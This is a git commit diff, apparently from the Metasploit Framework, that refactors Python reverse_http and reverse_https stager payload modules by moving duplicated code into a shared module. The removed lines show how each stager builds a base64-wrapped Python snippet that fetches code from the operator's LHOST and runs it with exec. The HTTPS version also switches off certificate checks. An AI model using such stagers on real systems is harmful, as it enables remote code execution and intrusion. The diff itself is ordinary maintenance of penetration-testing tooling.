1b495e73aca275c6b2853e2351c4e14a0358eb88
Spencer McIntyre <zeroSteiner@gmail.com>
2015-11-26 13:59:44 -0500

    Further reduce python reverse_http duplicate code

--- modules/payloads/stagers/python/reverse_http.rb
+++ modules/payloads/stagers/python/reverse_http.rb
@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_http'
+require 'msf/core/payload/python'
 require 'msf/core/payload/python/reverse_http'
 
 module Metasploit4
@@ -12,6 +13,7 @@ module Metasploit4
   CachedSize = 466
 
   include Msf::Payload::Stager
+  include Msf::Payload::Python
   include Msf::Payload::Python::ReverseHttp
 
   def initialize(info = {})
@@ -31,53 +33,6 @@ module Metasploit4
         OptString.new('PayloadProxyHost', [false, "The proxy server's IP address"]),
         OptPort.new('PayloadProxyPort', [true, "The proxy port to connect to", 8080 ])
       ], self.class)
-  end
-
-  #
-  # Constructs the payload
-  #
-  def generate
-    lhost = datastore['LHOST'] || '127.127.127.127'
-
-    var_escape = lambda { |txt|
-      txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
-    }
-
-    if Rex::Socket.is_ipv6?(lhost)
-      target_url = "http://[#{lhost}]"
-    else
-      target_url = "http://#{lhost}"
-    end
-
-    target_url << ':'
-    target_url << datastore['LPORT'].to_s
-    target_url << '/'
-    target_url << generate_callback_uri
-
-    proxy_host = datastore['PayloadProxyHost'].to_s
-    proxy_port = datastore['PayloadProxyPort'].to_i
-
-    cmd  = "import sys\n"
-    if proxy_host == ''
-      cmd << "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener()\n"
-    else
-      proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
-        "http://[#{proxy_host}]:#{proxy_port}" :
-        "http://#{proxy_host}:#{proxy_port}"
-
-      cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
-      cmd << "o=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
-    end
-
-    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
-    cmd << "exec(o.open('#{target_url}').read())\n"
-
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    b64_stub  = "import base64,sys;exec(base64.b64decode("
-    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
-    b64_stub << Rex::Text.encode_base64(cmd)
-    b64_stub << "')))"
-    return b64_stub
   end
 
 end
--- modules/payloads/stagers/python/reverse_https.rb
+++ modules/payloads/stagers/python/reverse_https.rb
@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
+require 'msf/core/payload/python'
 require 'msf/core/payload/python/reverse_http'
 
 module Metasploit4
@@ -12,6 +13,7 @@ module Metasploit4
   CachedSize = 762
 
   include Msf::Payload::Stager
+  include Msf::Payload::Python
   include Msf::Payload::Python::ReverseHttp
 
   def initialize(info = {})
@@ -37,60 +39,7 @@ module Metasploit4
   # Constructs the payload
   #
   def generate
-    lhost = datastore['LHOST'] || '127.127.127.127'
-
-    var_escape = lambda { |txt|
-      txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
-    }
-
-    if Rex::Socket.is_ipv6?(lhost)
-      target_url = "https://[#{lhost}]"
-    else
-      target_url = "https://#{lhost}"
-    end
-
-    target_url << ':'
-    target_url << datastore['LPORT'].to_s
-    target_url << generate_callback_uri
-
-    proxy_host = datastore['PayloadProxyHost'].to_s
-    proxy_port = datastore['PayloadProxyPort'].to_i
-
-    if proxy_host == ''
-      urllib_fromlist = "['HTTPSHandler','build_opener']"
-    else
-      urllib_fromlist = "['HTTPSHandler','ProxyHandler','build_opener']"
-    end
-
-    cmd  = "import sys\n"
-    cmd << "vi=sys.version_info\n"
-    cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=#{urllib_fromlist})\n"
-    cmd << "hs=[]\n"
-    # Context added to HTTPSHandler in 2.7.9 and 3.4.3
-    cmd << "if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):\n"
-    cmd << "\timport ssl\n"
-    cmd << "\tsc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)\n"
-    cmd << "\tsc.check_hostname=False\n"
-    cmd << "\tsc.verify_mode=ssl.CERT_NONE\n"
-    cmd << "\ths.append(ul.HTTPSHandler(0,sc))\n"
-
-    if proxy_host != ''
-      proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
-        "http://[#{proxy_host}]:#{proxy_port}" :
-        "http://#{proxy_host}:#{proxy_port}"
-      cmd << "hs.append(ul.ProxyHandler({'https':'#{var_escape.call(proxy_url)}'}))\n"
-    end
-
-    cmd << "o=ul.build_opener(*hs)\n"
-    cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
-    cmd << "exec(o.open('#{target_url}').read())\n"
-
-    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
-    b64_stub  = "import base64,sys;exec(base64.b64decode("
-    b64_stub << "{2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"
-    b64_stub << Rex::Text.encode_base64(cmd)
-    b64_stub << "')))"
-    return b64_stub
+    super({scheme: 'https'})
   end
 
 end
